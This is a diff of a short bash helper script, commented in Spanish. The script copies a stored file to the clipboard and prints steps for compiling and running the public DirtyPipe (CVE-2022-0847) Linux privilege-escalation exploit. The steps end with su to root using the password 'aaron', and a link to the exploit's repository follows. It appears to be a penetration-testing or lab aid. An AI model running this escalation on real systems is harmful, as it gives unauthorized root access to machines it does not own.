@@ -1,22 +1,24 @@
 #!/usr/bin/env bash
 
-se descarga en la maquina y se compila si tiene gcc
+
 
 
 #el archivo esta en noraa aqui mismo en binarios
-clipa noraa
+echo "cat /opt/4rji/bin/noraa | xclip -sel clip"
+cat /opt/4rji/bin/noraa | xclip -sel clip
 
-echo "crear un archivo llamado privesc.c con lo que se copio del portapapeles"
-ecgi "archivo noraa de los binarios"
 
-echo ""
-echo "se guarda como privesc.c en /tmp"
+echo "paso1: Renombra noraa a privesc.c"   
+echo "mv noraa privesc.c"
+echo "paso2: Compila el archivo"
 echo "gcc privesc.c -o privesc"
+echo "paso3: Ejecuta el archivo"
 echo "ejecutar ./privesc"
-
-echo ""
-echo "iniciar como su root"
+echo "paso4: Inicia como root"
 echo "pass:"
 echo "aaron"
+echo "paso5: Verifica si tienes privilegios de root"
 
-#https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/exploit.c
+
+echo "https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/exploit.c"
+
